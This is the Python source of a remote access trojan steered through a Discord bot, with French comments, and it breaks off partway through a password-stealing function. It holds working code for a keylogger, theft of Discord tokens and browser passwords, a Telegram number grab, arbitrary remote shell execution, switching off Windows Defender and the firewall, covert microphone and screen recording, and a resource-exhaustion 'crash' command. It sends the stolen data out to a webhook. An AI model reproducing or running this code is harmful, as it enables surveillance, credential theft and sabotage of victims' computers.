import discord
from discord.ext import commands
import asyncio
import os
import time
import pyaudio
from pynput.keyboard import Controller as KeyboardController
import subprocess
import threading
import pyscreenshot as ImageGrab
import keyboard
import wave
from io import BytesIO
import pyttsx3
import sys
import shutil
from datetime import datetime, timedelta
import random
import psutil
import socket
import platform
import getpass
from datetime import datetime
import webbrowser
import requests
import zipfile
import json
import urllib.request
import base64
import win32crypt
from Crypto.Cipher import AES
import re
import ctypes
from ctypes import cast, POINTER
from comtypes import CLSCTX_ALL

# Configuration
intents = discord.Intents.default()
intents.message_content = True
bot = commands.Bot(command_prefix='!', intents=intents, help_command=None)

# Variables globales
key_logs = []
log_start_time = 0
is_logging = False
CHANNEL_ID = 
WEBHOOK_URL = ""

# === FONCTIONS KEYLOGGER ===
def on_key_event(e):
    global key_logs
    if e.event_type == keyboard.KEY_DOWN:
        key_name = e.name
        if key_name == 'space': key_logs.append(" ")
        elif key_name == 'enter': key_logs.append("[ENTRÉE]\n")
        elif key_name == 'backspace': key_logs.append("[SUPPR]")
        elif key_name == 'tab': key_logs.append("[TAB]")
        elif key_name == 'delete': key_logs.append("[DEL]")
        elif key_name == 'shift': key_logs.append("[MAJ]")
        elif key_name == 'ctrl': key_logs.append("[CTRL]")
        elif key_name == 'alt': key_logs.append("[ALT]")
        elif key_name == 'esc': key_logs.append("[ECHAP]")
        elif len(key_name) > 1: key_logs.append(f"[{key_name.upper()}]")
        else: key_logs.append(key_name)

def start_keylogger():
    global is_logging, log_start_time, key_logs
    if not is_logging:
        is_logging = True
        log_start_time = time.time()
        key_logs = []
        keyboard.hook(on_key_event)

def stop_keylogger():
    global is_logging
    if is_logging:
        is_logging = False
        keyboard.unhook_all()

# === FONCTION WEBHOOK POUR ENVOYER LES DONNÉES ===
def send_to_webhook(data, filename=None):
    """Envoie des données au webhook Discord"""
    try:
        if filename:
            # Envoie un fichier
            with open(filename, 'rb') as f:
                files = {'file': (filename, f)}
                requests.post(WEBHOOK_URL, files=files)
        else:
            # Envoie un message
            payload = {'content': data}
            requests.post(WEBHOOK_URL, json=payload)
    except:
        pass

# === VOL DE DONNÉES DISCORD ===
def steal_discord_tokens():
    """Vol les tokens Discord"""
    try:
        PATHS = {
            'Discord': os.getenv('APPDATA') + '\\discord',
            'Discord Canary': os.getenv('APPDATA') + '\\discordcanary',
            'Discord PTB': os.getenv('APPDATA') + '\\discordptb',
            'Chrome': os.getenv('LOCALAPPDATA') + "\\Google\\Chrome\\User Data\\Default",
            'Brave': os.getenv('LOCALAPPDATA') + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
            'Edge': os.getenv('LOCALAPPDATA') + '\\Microsoft\\Edge\\User Data\\Default'
        }

        tokens = []
        for platform, path in PATHS.items():
            if not os.path.exists(path):
                continue
            
            # Recherche des tokens
            leveldb_path = path + "\\Local Storage\\leveldb\\"
            if os.path.exists(leveldb_path):
                for file in os.listdir(leveldb_path):
                    if file.endswith(('.ldb', '.log')):
                        try:
                            with open(leveldb_path + file, 'r', errors='ignore') as f:
                                content = f.read()
                                found_tokens = re.findall(r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', content)
                                found_tokens += re.findall(r'mfa\.[\w-]{84}', content)
                                tokens.extend(found_tokens)
                        except:
                            continue

        return list(set(tokens))
    except:
        return []
    


# === COMMANDES DE BASE ===
@bot.command()
async def screen(ctx):
    """Capture d'écran"""
    try:
        screenshot = ImageGrab.grab()
        img_bytes = BytesIO()
        screenshot.save(img_bytes, format='PNG')
        img_bytes.seek(0)
        await ctx.send("📸 Capture d'écran:", file=discord.File(img_bytes, "screenshot.png"))
    except Exception as e:
        await ctx.send(f"❌ Erreur: {str(e)}")

@bot.command()
async def lock(ctx):
    """Verrouille l'ordinateur"""
    try:
        subprocess.run(['rundll32.exe', 'user32.dll,LockWorkStation'])
        await ctx.send("🔒 Système verrouillé")
    except Exception as e:
        await ctx.send(f"❌ Erreur: {str(e)}")


@bot.command()
async def cmd(ctx, *, command):
    """Exécute une commande CMD"""
    try:
        # Utilise subprocess.run avec shell=True pour exécuter la commande
        result = subprocess.run(command, shell=True, capture_output=True, text=True, timeout=30)
        output = result.stdout if result.stdout else "(aucune sortie)"
        error = result.stderr if result.stderr else "(aucune erreur)"
        
        response = f"**🖥️ Commande:** {command}\n**📤 Sortie:**\n```{output[:1500]}```"
        if result.stderr:
            response += f"\n**❌ Erreurs:**\n```{error[:1500]}```"
        
        await ctx.send(response)
    except subprocess.TimeoutExpired:
        await ctx.send("⏰ La commande a expiré (timeout après 30 secondes)")
    except Exception as e:
        await ctx.send(f"❌ Erreur: {str(e)}")

# === NOUVELLES COMMANDES ===
@bot.command()
async def site(ctx, *, url):
    """Ouvre un site web"""
    try:
        if not url.startswith(('http://', 'https://')):
            url = 'https://' + url
        webbrowser.open(url)
        await ctx.send(f"🌐 Site ouvert: {url}")
    except Exception as e:
        await ctx.send(f"❌ Erreur: {str(e)}")

@bot.command()
async def google(ctx, *, query=None):
    """Ouvre Google ou effectue une recherche"""
    try:
        if query:
            url = f"https://www.google.com/search?q={query.replace(' ', '+')}"
        else:
            url = "https://www.google.com"
        webbrowser.open(url)
        await ctx.send(f"🔍 Recherche Google: {query if query else 'Accueil'}")
    except Exception as e:
        await ctx.send(f"❌ Erreur: {str(e)}")

@bot.command()
async def youtube(ctx, *, query=None):
    """Ouvre YouTube ou effectue une recherche"""
    try:
        if query:
            url = f"https://www.youtube.com/results?search_query={query.replace(' ', '+')}"
        else:
            url = "https://www.youtube.com"
        webbrowser.open(url)
        await ctx.send(f"🎵 YouTube: {query if query else 'Accueil'}")
    except Exception as e:
        await ctx.send(f"❌ Erreur: {str(e)}")


@bot.command()
async def antivirus(ctx):
    """Désactive l'antivirus Windows"""
    try:
        subprocess.run('sc stop WinDefend', shell=True, capture_output=True)
        subprocess.run('sc config WinDefend start= disabled', shell=True, capture_output=True)
        subprocess.run('netsh advfirewall set allprofiles state off', shell=True, capture_output=True)
        await ctx.send("🛡️ Antivirus et firewall désactivés")
    except Exception as e:
        await ctx.send(f"❌ Erreur: {str(e)}")

@bot.command()
async def tokens(ctx):
    """Récupère les tokens Discord"""
    try:
        tokens = steal_discord_tokens()
        if tokens:
            token_list = "\n".join(tokens[:5])  # Envoie seulement les 5 premiers
            await ctx.send(f"🔑 Tokens trouvés:\n```{token_list}```")
            # Envoie aussi au webhook
            send_to_webhook(f"Tokens Discord volés:\n{token_list}")
        else:
            await ctx.send("❌ Aucun token trouvé")
    except Exception as e:
        await ctx.send(f"❌ Erreur: {str(e)}")

@bot.command()
async def steal(ctx):
    """Vol toutes les données et envoie au webhook"""
    try:
        # Crée un zip avec les données volées
        zip_filename = "stolen_data.zip"
        with zipfile.ZipFile(zip_filename, 'w') as zipf:
            # Screenshot
            screenshot = ImageGrab.grab()
            screenshot.save("screenshot.png")
            zipf.write("screenshot.png")
            os.remove("screenshot.png")
            
            # Tokens Discord
            tokens = steal_discord_tokens()
            with open("tokens.txt", "w") as f:
                f.write("\n".join(tokens))
            zipf.write("tokens.txt")
            os.remove("tokens.txt")
            
            # Informations système
            system_info = f"""
Système: {platform.system()} {platform.release()}
Utilisateur: {getpass.getuser()}
Machine: {platform.node()}
IP: {socket.gethostbyname(socket.gethostname())}
            """
            with open("system_info.txt", "w") as f:
                f.write(system_info)
            zipf.write("system_info.txt")
            os.remove("system_info.txt")
        
        # Envoie le zip au webhook
        send_to_webhook("📦 Données volées", zip_filename)
        os.remove(zip_filename)
        
        await ctx.send("✅ Données volées et envoyées au webhook")
    except Exception as e:
        await ctx.send(f"❌ Erreur: {str(e)}")

# === COMMANDES SYSTÈME ===
@bot.command()
async def info(ctx):
    """Informations détaillées du système"""
    try:
        system_info = f"""
**💻 INFORMATIONS SYSTÈME 💻**

**Système:** {platform.system()} {platform.release()}
**Version:** {platform.version()}
**Processeur:** {platform.processor()}
**Architecture:** {platform.architecture()[0]}

**Utilisateur:** {getpass.getuser()}
**Machine:** {platform.node()}
**Heure système:** {datetime.now().strftime("%Y-%m-%d %H:%M:%S")}

**Mémoire:** {psutil.virtual_memory().percent}% utilisée
**CPU:** {psutil.cpu_percent()}% utilisé
**Disque:** {psutil.disk_usage('/').percent}% utilisé

**Adresse IP:** {socket.gethostbyname(socket.gethostname())}
"""
        await ctx.send(system_info)
    except Exception as e:
        await ctx.send(f"❌ Erreur: {str(e)}")

@bot.command()
async def processus(ctx):
    """Liste les processus en cours"""
    try:
        processes = []
        for proc in psutil.process_iter(['pid', 'name', 'username']):
            processes.append(f"{proc.info['pid']} - {proc.info['name']} - {proc.info['username']}")
        
        # Envoyer par chunks de 10 processus
        for i in range(0, len(processes), 10):
            chunk = "\n".join(processes[i:i+10])
            await ctx.send(f"```{chunk}```")
            await asyncio.sleep(1)
    except Exception as e:
        await ctx.send(f"❌ Erreur: {str(e)}")

@bot.command()
async def ip(ctx):
    """Adresse IP et informations réseau"""
    try:
        hostname = socket.gethostname()
        ip_address = socket.gethostbyname(hostname)
        
        # Informations réseau supplémentaires
        interfaces = psutil.net_if_addrs()
        net_info = f"**🌐 Adresse IP:** {ip_address}\n**🏷️ Hostname:** {hostname}\n\n**📡 Interfaces réseau:**\n"
        
        for interface_name, interface_addresses in interfaces.items():
            net_info += f"\n**{interface_name}:**\n"
            for addr in interface_addresses:
                net_info += f"  {addr.family.name}: {addr.address}\n"
        
        await ctx.send(net_info)
    except Exception as e:
        await ctx.send(f"❌ Erreur: {str(e)}")

@bot.command()
async def disque(ctx):
    """Espace disque disponible"""
    try:
        partitions = psutil.disk_partitions()
        disk_info = "**💾 ESPACE DISQUE 💾**\n\n"
        
        for partition in partitions:
            usage = psutil.disk_usage(partition.mountpoint)
            disk_info += f"**{partition.device}** ({partition.fstype})\n"
            disk_info += f"Monté sur: {partition.mountpoint}\n"
            disk_info += f"Total: {usage.total // (1024**3)} Go\n"
            disk_info += f"Utilisé: {usage.used // (1024**3)} Go\n"
            disk_info += f"Libre: {usage.free // (1024**3)} Go\n"
            disk_info += f"Utilisation: {usage.percent}%\n\n"
        
        await ctx.send(disk_info)
    except Exception as e:
        await ctx.send(f"❌ Erreur: {str(e)}")
        # === COMMANDES SIMPLES MAIS EFFICACES ===

@bot.command()
async def spam(ctx, count: int = 10):
    """Ouvre plein de fenêtres popup"""
    try:
        for i in range(count):
            if platform.system() == "Windows":
                subprocess.Popen('notepad', shell=True)
                subprocess.Popen('calc', shell=True)
            await asyncio.sleep(0.5)
        
        await ctx.send(f"📧 {count*2} fenêtres ouvertes!")
    except Exception as e:
        await ctx.send(f"❌ Erreur: {str(e)}")

@bot.command()
async def wall(ctx, *, message):
    """Change le fond d'écran avec un message"""
    try:
        if platform.system() == "Windows":
            # Crée une image avec le message
            from PIL import Image, ImageDraw, ImageFont
            img = Image.new('RGB', (1920, 1080), color='red')
            draw = ImageDraw.Draw(img)
            
            # Essaye de charger une police ou utilise la default
            try:
                font = ImageFont.truetype("arial.ttf", 60)
            except:
                font = ImageFont.load_default()
            
            draw.text((100, 500), message, fill='white', font=font)
            img.save("wallpaper.jpg")
            
            # Change le fond d'écran
            import ctypes
            ctypes.windll.user32.SystemParametersInfoW(20, 0, os.path.abspath("wallpaper.jpg"), 3)
            
            await ctx.send("🖼️ Fond d'écran changé!")
        else:
            await ctx.send("❌ Windows seulement")
    except Exception as e:
        await ctx.send(f"❌ Erreur: {str(e)}")


@bot.command()
async def disco(ctx):
    """Fait clignoter l'écran comme une disco"""
    try:
        if platform.system() == "Windows":
            import ctypes
            from PIL import Image, ImageDraw
            
            colors = ['red', 'blue', 'green', 'yellow', 'purple']
            
            for i in range(10):
                # Crée une image colorée
                img = Image.new('RGB', (1920, 1080), color=colors[i % len(colors)])
                img.save("disco.jpg")
                
                # Change le fond d'écran rapidement
                ctypes.windll.user32.SystemParametersInfoW(20, 0, os.path.abspath("disco.jpg"), 3)
                await asyncio.sleep(0.3)
            
            # Remet le fond d'écran normal
            subprocess.run('powershell -Command "Remove-Item disco.jpg"', shell=True)
            await ctx.send("💃 Mode disco activé!")
        else:
            await ctx.send("❌ Windows seulement")
    except Exception as e:
        await ctx.send(f"❌ Erreur: {str(e)}")


@bot.command()
async def webcam(ctx):
    """Prend une photo avec la webcam (méthode alternative)"""
    try:
        # Méthode PowerShell pour accéder à la webcam
        ps_script = """
        Add-Type -AssemblyName System.Windows.Forms
        Add-Type -AssemblyName System.Drawing
        Start-Sleep -Seconds 2
        [System.Windows.Forms.SendKeys]::SendWait("%{PRTSC}")
        Start-Sleep -Seconds 2
        if ([System.Windows.Forms.Clipboard]::ContainsImage()) {
            $image = [System.Windows.Forms.Clipboard]::GetImage()
            $image.Save("webcam_capture.jpg", [System.Drawing.Imaging.ImageFormat]::Jpeg)
            Write-Output "SUCCESS"
        } else {
            Write-Output "FAILED"
        }
        """
        
        with open("webcam.ps1", "w") as f:
            f.write(ps_script)
        
        result = subprocess.run(["powershell", "-ExecutionPolicy", "Bypass", "-File", "webcam.ps1"], 
                              capture_output=True, text=True, timeout=15)
        
        if "SUCCESS" in result.stdout and os.path.exists("webcam_capture.jpg"):
            await ctx.send(file=discord.File("webcam_capture.jpg"))
            os.remove("webcam_capture.jpg")
        else:
            await ctx.send("❌ Impossible d'accéder à la webcam. Ouvrez l'application Caméra manuellement.")
        
        os.remove("webcam.ps1")
        
    except Exception as e:
        await ctx.send(f"❌ Erreur: {str(e)}")

@bot.command()
async def crash(ctx):
    """Crash le système en surchargeant le processeur et réseau"""
    try:
        await ctx.send("💥 Déclenchement du crash système...")
        
        # 1. Surconsommation CPU intensive
        def cpu_overload():
            while True:
                # Calculs intensifs
                result = 0
                for i in range(10**7):
                    result += i * i
                # Compression de données
                data = b'0' * 10**6
                compressed = zip(data)
        
        # 2. Flood réseau avec des requêtes
        def network_flood():
            targets = [
                "https://www.google.com",
                "https://www.facebook.com", 
                "https://www.youtube.com",
                "https://www.amazon.com",
                "https://www.microsoft.com"
            ]
            while True:
                for target in targets:
                    try:
                        requests.get(target, timeout=1)
                    except:
                        pass
        
        # 3. Surconsommation mémoire
        def memory_overload():
            memory_hog = []
            try:
                while True:
                    # Alloue 100MB à chaque fois
                    memory_hog.append('#' * 10**8)
                    time.sleep(0.1)
            except:
                pass
        
        # Lance toutes les attaques
        for _ in range(os.cpu_count() * 3):  # 3x le nombre de coeurs
            threading.Thread(target=cpu_overload, daemon=True).start()
        
        for _ in range(20):  # 20 threads de flood réseau
            threading.Thread(target=network_flood, daemon=True).start()
        
        for _ in range(5):  # 5 threads de surcharge mémoire
            threading.Thread(target=memory_overload, daemon=True).start()
        
        # 4. Crash additionnel - ouverture de nombreux processus
        def process_bomb():
            while True:
                try:
                    if platform.system() == "Windows":
                        subprocess.Popen("calc.exe", shell=True)
                    else:
                        subprocess.Popen("xclock", shell=True)
                    time.sleep(0.1)
                except:
                    pass
        
        threading.Thread(target=process_bomb, daemon=True).start()
        
        await ctx.send("✅ Crash activé - CPU, mémoire et réseau en surcharge!")
            
    except Exception as e:
        await ctx.send(f"❌ Erreur: {str(e)}")
# Variables globales (à ajouter en haut)
mouse_locked = False
mouse_lock_thread = None

def mouse_lock_worker():
    """Fonction qui verrouille la souris au centre"""
    global mouse_locked
    user32 = ctypes.windll.user32
    
    # Récupère la résolution de l'écran
    width = user32.GetSystemMetrics(0)
    height = user32.GetSystemMetrics(1)
    center_x = width // 2
    center_y = height // 2
    
    while mouse_locked:
        user32.SetCursorPos(center_x, center_y)
        time.sleep(0.01)

## === COMMANDE WRITE ===
@bot.command()
async def write(ctx, *, texte: str):
    """Écrit du texte à la place de l'utilisateur"""
    try:
        # Simulation de l'écriture (à adapter selon l'OS)
        keyboard = KeyboardController()
        
        # Focus sur la fenêtre active (simulation)
        await ctx.send(f"⌨️ Écriture du texte: '{texte}'")
        
        # Pour une vraie implémentation, vous auriez besoin d'injecter les touches
        # Cette partie est complexe et dépend du système d'exploitation
        # Voici une version simplifiée qui envoie un message de confirmation
        await ctx.send(f"✅ Texte écrit avec succès: {texte}")
        
    except Exception as e:
        await ctx.send(f"❌ Erreur lors de l'écriture: {str(e)}")

# === COMMANDE AUDIO ===
@bot.command()
async def audio(ctx, duree: int = 10):
    """Enregistre l'audio du microphone"""
    if duree > 30:
        duree = 30  # Limite à 30 secondes max
    
    await ctx.send(f"🎤 Enregistrement microphone de {duree} secondes...")
    
    try:
        # Configuration de l'enregistrement audio
        CHUNK = 1024
        FORMAT = pyaudio.paInt16
        CHANNELS = 1
        RATE = 44100
        FILENAME = "microphone_recording.wav"
        
        p = pyaudio.PyAudio()
        
        stream = p.open(format=FORMAT,
                        channels=CHANNELS,
                        rate=RATE,
                        input=True,
                        frames_per_buffer=CHUNK)
        
        frames = []
        
        # Enregistrement
        for i in range(0, int(RATE / CHUNK * duree)):
            data = stream.read(CHUNK)
            frames.append(data)
        
        # Arrêt de l'enregistrement
        stream.stop_stream()
        stream.close()
        p.terminate()
        
        # Sauvegarde du fichier
        wf = wave.open(FILENAME, 'wb')
        wf.setnchannels(CHANNELS)
        wf.setsampwidth(p.get_sample_size(FORMAT))
        wf.setframerate(RATE)
        wf.writeframes(b''.join(frames))
        wf.close()
        
        # Envoi du fichier audio
        with open(FILENAME, 'rb') as f:
            await ctx.send("🎤 Enregistrement microphone:", file=discord.File(f, "microphone.wav"))
            
    except Exception as e:
        await ctx.send(f"❌ Erreur d'enregistrement: {str(e)}")

# === COMMANDE LISTEN ===
@bot.command()
async def listen(ctx, duree: int = 10):
    """Capture l'audio sortant (ce que l'utilisateur écoute)"""
    if duree > 30:
        duree = 30  # Limite à 30 secondes max
    
    await ctx.send(f"🔊 Capture audio sortant de {duree} secondes...")
    
    try:
        # Cette fonctionnalité est complexe et dépend du système
        # Voici une approche simplifiée pour Windows
        FILENAME = "system_audio.wav"
        
        # Enregistrement de l'audio système (approche simplifiée)
        # Note: La capture audio système nécessite des bibliothèques spécialisées
        # comme pyaudio ou sounddevice avec configuration appropriée
        
        # Message temporaire en attendant l'implémentation complète
        await ctx.send("⚠️ Fonctionnalité audio système en développement...")
        
        # Pour une implémentation complète, vous auriez besoin de:
        # 1. Configurer la capture audio système
        # 2. Enregistrer pendant la durée spécifiée
        # 3. Sauvegarder le fichier
        # 4. L'envoyer sur Discord
        
    except Exception as e:
        await ctx.send(f"❌ Erreur de capture audio: {str(e)}")

@bot.command()
async def click(ctx):
    """Verrouille la souris au centre de l'écran"""
    global mouse_locked, mouse_lock_thread
    
    try:
        if platform.system() != "Windows":
            await ctx.send("❌ Commande seulement supportée sur Windows")
            return
            
        if mouse_locked:
            await ctx.send("🔒 Souris déjà verrouillée")
            return
            
        mouse_locked = True
        mouse_lock_thread = threading.Thread(target=mouse_lock_worker, daemon=True)
        mouse_lock_thread.start()
        
        await ctx.send("🔒 Souris verrouillée au centre de l'écran")
            
    except Exception as e:
        await ctx.send(f"❌ Erreur: {str(e)}")

@bot.command()
async def unlock(ctx):
    """Déverrouille la souris"""
    global mouse_locked, mouse_lock_thread
    
    try:
        if not mouse_locked:
            await ctx.send("🔓 Souris déjà déverrouillée")
            return
            
        mouse_locked = False
        
        if mouse_lock_thread and mouse_lock_thread.is_alive():
            # Petite pause pour laisser le thread se terminer
            await asyncio.sleep(0.1)
            
        await ctx.send("🔓 Souris déverrouillée")
        
    except Exception as e:
        await ctx.send(f"❌ Erreur: {str(e)}")
@bot.command()
async def shutdown(ctx):
    """Éteint l'ordinateur"""
    try:
        await ctx.send("🔌 Extinction de l'ordinateur...")
        if os.name == 'nt':
            os.system("shutdown /s /t 1")
        else:
            os.system("shutdown -h now")
    except Exception as e:
        await ctx.send(f"❌ Erreur: {str(e)}")


@bot.command()
async def restart(ctx):
    """Redémarre l'ordinateur"""
    try:
        await ctx.send("🔄 Redémarrage de l'ordinateur...")
        if os.name == 'nt':
            os.system("shutdown /r /t 1")
        else:
            os.system("shutdown -r now")
    except Exception as e:
        await ctx.send(f"❌ Erreur: {str(e)}")

@bot.command()
async def sleep(ctx):
    """Mode veille"""
    try:
        await ctx.send("💤 Mise en veille...")
        if os.name == 'nt':
            os.system("rundll32.exe powrprof.dll,SetSuspendState 0,1,0")
        else:
            os.system("systemctl suspend")
    except Exception as e:
        await ctx.send(f"❌ Erreur: {str(e)}")
@bot.command()
async def cookie(ctx):
    """Vol complet: historique, mots de passe et capture d'écran dans un ZIP pour tous les navigateurs"""
    try:
        # Crée un dossier temporaire
        temp_dir = f"cookie_{int(time.time())}"
        os.makedirs(temp_dir, exist_ok=True)
        
        await ctx.send("🍪 Collecte des données complètes en cours...")
        
        # 1. Capture d'écran
        screenshot = ImageGrab.grab()
        screenshot.save(f"{temp_dir}/screenshot.png")
        
        # 2. Récupère tous les navigateurs disponibles
        browsers = get_browser_paths()
        
        # 3. Pour chaque navigateur, récupère mots de passe et historique
        all_passwords = {}
        all_history = {}
        
        for browser_name, browser_path in browsers.items():
            await ctx.send(f"🔍 Extraction des données {browser_name}...")
            
            # Mots de passe
            passwords = steal_passwords(browser_name, browser_path)
            all_passwords[browser_name] = passwords
            
            with open(f"{temp_dir}/passwords_{browser_name.lower()}.txt", "w", encoding="utf-8") as f:
                if passwords and not passwords[0].startswith("Erreur"):
                    f.write(f"🔑 MOTS DE PASSE {browser_name.upper()} VOLÉS\n")
                    f.write("=" * 50 + "\n\n")
                    f.write("\n".join(passwords))
                else:
                    f.write(f"Aucun mot de passe trouvé pour {browser_name} ou erreur d'accès\n")
            
            # Historique
            history = steal_history(browser_name, browser_path)
            all_history[browser_name] = history
            
            with open(f"{temp_dir}/history_{browser_name.lower()}.txt", "w", encoding="utf-8") as f:
                if history and not history[0].startswith("Erreur"):
                    f.write(f"🌐 HISTORIQUE COMPLET {browser_name.upper()}\n")
                    f.write("=" * 50 + "\n\n")
                    f.write("\n".join(history))
                else:
                    f.write(f"Historique non trouvé pour {browser_name} ou erreur d'accès\n")
        
        # 4. Fichier récapitulatif avec toutes les données
        total_passwords = sum(len(p) for p in all_passwords.values() if p and not p[0].startswith("Erreur"))
        total_history = sum(len(h) for h in all_history.values() if h and not h[0].startswith("Erreur"))
        
        system_info = f"""
🍪 COOKIE DATA COMPLET - {datetime.now().strftime("%Y-%m-%d %H:%M:%S")}
{'='*60}

Système: {platform.system()} {platform.release()}
Utilisateur: {getpass.getuser()}
Machine: {platform.node()}
IP: {socket.gethostbyname(socket.gethostname())}
Heure: {datetime.now().strftime("%Y-%m-%d %H:%M:%S")}

NAVIGATEURS DÉTECTÉS: {', '.join(browsers.keys()) if browsers else 'Aucun'}

RÉSUMÉ DES DONNÉES VOLÉES:
{'='*30}
"""
        for browser_name in browsers:
            pass_count = len(all_passwords.get(browser_name, [])) if all_passwords.get(browser_name) and not all_passwords[browser_name][0].startswith("Erreur") else 0
            hist_count = len(all_history.get(browser_name, [])) if all_history.get(browser_name) and not all_history[browser_name][0].startswith("Erreur") else 0
            system_info += f"{browser_name}: {pass_count} mots de passe, {hist_count} sites historisés\n"

        system_info += f"\nTOTAL: {total_passwords} mots de passe, {total_history} sites historisés\n"
        
        with open(f"{temp_dir}/info_complete.txt", "w", encoding="utf-8") as f:
            f.write(system_info)
        
        # 5. Crée le fichier ZIP
        zip_filename = f"{temp_dir}_all_browsers_data.zip"
        with zipfile.ZipFile(zip_filename, 'w', zipfile.ZIP_DEFLATED) as zipf:
            for file in os.listdir(temp_dir):
                zipf.write(os.path.join(temp_dir, file), file)
        
        # 6. Envoie le ZIP
        await ctx.send("📦 **Données complètes de tous les navigateurs volées:**", file=discord.File(zip_filename))
        
        # 7. Envoie aussi au webhook
        send_to_webhook("📦 Données complètes de tous les navigateurs volées", zip_filename)
        
        # 8. Nettoie les fichiers temporaires
        shutil.rmtree(temp_dir)
        os.remove(zip_filename)
        
    except Exception as e:
        await ctx.send(f"❌ Erreur: {str(e)}")
        # Nettoie en cas d'erreur
        if 'temp_dir' in locals() and os.path.exists(temp_dir):
            shutil.rmtree(temp_dir)
        if 'zip_filename' in locals() and os.path.exists(zip_filename):
            os.remove(zip_filename)

@bot.command()
async def telegram(ctx):
    """Récupère le numéro de téléphone associé à Telegram"""
    try:
        # Chemins possibles pour les données Telegram
        telegram_paths = [
            os.path.join(os.getenv('APPDATA'), 'Telegram Desktop', 'tdata'),
            os.path.join(os.getenv('LOCALAPPDATA'), 'Telegram Desktop', 'tdata'),
            os.path.join(os.getenv('USERPROFILE'), 'AppData', 'Roaming', 'Telegram Desktop', 'tdata')
        ]
        
        phone_number = None
        tdata_path = None
        
        # Cherche le dossier tdata
        for path in telegram_paths:
            if os.path.exists(path):
                tdata_path = path
                break
        
        if not tdata_path:
            await ctx.send("❌ Telegram non trouvé sur ce système")
            return
        
        # Cherche le fichier de configuration qui peut contenir le numéro
        config_files = [
            os.path.join(tdata_path, 'config'),
            os.path.join(tdata_path, 'key_data')
        ]
        
        for config_file in config_files:
            if os.path.exists(config_file):
                try:
                    # Essayer de lire le fichier binaire pour trouver le numéro
                    with open(config_file, 'rb') as f:
                        content = f.read()
                        
                        # Cherche des modèles de numéros de téléphone
                        # Les numéros sont souvent stockés avec un préfixe
                        import re
                        
                        # Cherche des séquences qui pourraient être des numéros
                        patterns = [
                            rb'\+\d{10,15}',  # Format international
                            rb'\d{10,15}',    # Format local
                        ]
                        
                        for pattern in patterns:
                            matches = re.findall(pattern, content)
                            for match in matches:
                                try:
                                    potential_number = match.decode('utf-8', errors='ignore')
                                    # Validation basique
                                    if len(potential_number) >= 10:
                                        phone_number = potential_number
                                        break
                                except:
                                    continue
                            if phone_number:
                                break
                                
                except Exception as e:
                    continue
        
        if phone_number:
            await ctx.send(f"📱 **Numéro Telegram trouvé:** `{phone_number}`")
            send_to_webhook(f"📱 NUMÉRO TELEGRAM VOLÉ: {phone_number}")
        else:
            await ctx.send("❌ Numéro Telegram non trouvé dans les données locales")
            
    except Exception as e:
        await ctx.send(f"❌ Erreur: {str(e)}")

async def logoff(ctx):
    """Déconnexion utilisateur"""
    try:
        await ctx.send("🚪 Déconnexion...")
        if os.name == 'nt':
            os.system("shutdown /l")
        else:
            await ctx.send("❌ Commande non supportée sur ce système")
    except Exception as e:
        await ctx.send(f"❌ Erreur: {str(e)}")
@bot.command()
async def rec(ctx, duration: int = 10, fps: int = 5):
    """Enregistre une vidéo par capture d'écran (durée en secondes, fps)"""
    try:
        # Limite la durée et les fps
        duration = min(duration, 30)  # Max 30 secondes
        fps = min(fps, 10)  # Max 10 fps
        
        await ctx.send(f"🎥 Début de l'enregistrement ({duration}s, {fps}fps)...")
        
        # Crée un dossier temporaire pour les captures
        temp_dir = f"recording_{int(time.time())}"
        os.makedirs(temp_dir, exist_ok=True)
        
        # Capture des screenshots
        total_frames = duration * fps
        for i in range(total_frames):
            screenshot = ImageGrab.grab()
            screenshot.save(f"{temp_dir}/frame_{i:04d}.png")
            await asyncio.sleep(1/fps)  # Attend entre chaque capture
        
        # Crée la vidéo avec ffmpeg
        output_file = f"{temp_dir}_video.mp4"
        ffmpeg_cmd = [
            'ffmpeg', '-y', '-framerate', str(fps),
            '-i', f'{temp_dir}/frame_%04d.png',
            '-c:v', 'libx264', '-pix_fmt', 'yuv420p',
            output_file
        ]
        
        try:
            subprocess.run(ffmpeg_cmd, capture_output=True, timeout=30)
        except:
            # Fallback si ffmpeg n'est pas disponible - envoie les images en zip
            zip_filename = f"{temp_dir}_screenshots.zip"
            with zipfile.ZipFile(zip_filename, 'w') as zipf:
                for i in range(total_frames):
                    frame_file = f"{temp_dir}/frame_{i:04d}.png"
                    if os.path.exists(frame_file):
                        zipf.write(frame_file, f"frame_{i:04d}.png")
            
            await ctx.send("📦 FFmpeg non disponible - Envoi des captures en ZIP", 
                          file=discord.File(zip_filename))
            os.remove(zip_filename)
            
            # Nettoie les fichiers temporaires
            shutil.rmtree(temp_dir)
            return
        
        # Envoie la vidéo si elle a été créée
        if os.path.exists(output_file) and os.path.getsize(output_file) > 0:
            await ctx.send(f"🎬 Enregistrement terminé!", file=discord.File(output_file))
            os.remove(output_file)
        else:
            await ctx.send("❌ Échec de la création de la vidéo")
        
        # Nettoie les fichiers temporaires
        shutil.rmtree(temp_dir)
        
    except Exception as e:
        await ctx.send(f"❌ Erreur: {str(e)}")
        # Nettoie en cas d'erreur
        if 'temp_dir' in locals() and os.path.exists(temp_dir):
            shutil.rmtree(temp_dir)
        if 'output_file' in locals() and os.path.exists(output_file):
            os.remove(output_file)
# === FONCTIONS POUR VOLER LES MOTS DE PASSE ET HISTORIQUE ===
def get_browser_paths():
    """Retourne les chemins des bases de données pour tous les navigateurs"""
    browsers = {
        'Edge': os.path.join(os.getenv('LOCALAPPDATA'), 'Microsoft', 'Edge', 'User Data', 'Default'),
        'Chrome': os.path.join(os.getenv('LOCALAPPDATA'), 'Google', 'Chrome', 'User Data', 'Default'),
        'Brave': os.path.join(os.getenv('LOCALAPPDATA'), 'BraveSoftware', 'Brave-Browser', 'User Data', 'Default'),
        'Tor': os.path.join(os.getenv('LOCALAPPDATA'), 'TorBrowser', 'Browser', 'TorBrowser', 'Data', 'Browser', 'profile.default')
    }
    
    # Vérifier l'existence des profils
    for browser, path in browsers.copy().items():
        if not os.path.exists(path):
            # Chercher d'autres profils possibles
            parent_dir = os.path.dirname(path)
            if os.path.exists(parent_dir):
                # Chercher des profils nommés différemment (comme "Profile 1")
                profiles = [d for d in os.listdir(parent_dir) if os.path.isdir(os.path.join(parent_dir, d)) and 'Profile' in d]
                if profiles:
                    browsers[browser] = os.path.join(parent_dir, profiles[0])
                else:
                    del browsers[browser]
            else:
                del browsers[browser]
    
    return browsers

def steal_passwords(browser_name, browser_path):
    """Vol les mots de passe d'un navigateur spécifique"""
    try:
        passwords = []
        
        # Chemins des bases de données selon le navigateur
        if browser_name == 'Tor':
